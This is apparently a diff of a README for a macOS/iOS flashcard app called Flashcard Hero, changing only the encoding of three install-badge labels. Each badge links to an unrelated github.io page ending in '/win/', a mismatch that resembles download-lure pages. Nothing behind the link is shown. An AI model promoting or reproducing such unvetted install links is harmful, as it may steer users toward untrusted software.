@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard%20Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard+Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Flashcard Hero is a macOS and iOS flashcard app for students and learners. It pr
 
 <div align="center">
 
-[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard%20Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard+Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Flashcard Hero is a macOS and iOS flashcard app for students and learners. It pr
 
 <div align="center">
 
-[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard%20Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Flashcard Hero](https://img.shields.io/badge/⬇_Install_Flashcard+Hero-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
